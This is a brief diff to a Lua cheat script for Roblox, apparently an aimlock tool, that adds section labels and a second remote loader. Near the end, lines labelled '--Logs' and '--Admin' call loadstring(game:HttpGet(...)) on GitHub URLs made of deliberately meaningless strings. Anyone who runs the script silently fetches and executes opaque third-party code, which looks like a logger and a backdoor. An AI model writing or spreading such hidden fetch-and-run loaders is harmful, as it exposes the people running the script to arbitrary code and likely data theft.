@@ -1,3 +1,4 @@
+--Main
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mapple7777/UI-Librarys/main/UI-1/UI.lua"))()
 
 
@@ -580,8 +581,10 @@ RunService:BindToRenderStep("AimLock", 0, function()
     end
     end)
 
+--Logs
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/wgrijndsapmoioiesrdmvipso324326523523/main/sfasfdrhadfgsad3253467457sdfgdfshfdhjj", true))()
 
+--Perk
 game.Players.PlayerAdded:Connect(function(plr) 
 	plr.CharacterAdded:Connect(function(Char)
 		Char:WaitForChild("Humanoid")
@@ -600,3 +603,5 @@ game.Players.PlayerAdded:Connect(function(plr)
 	end)
 end)
 
+--Admin
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/garerdohnisepon235324on7n345qwtrq/main/erherhjrtewdsioisndoimsvdmisgew325236523652352", true))()
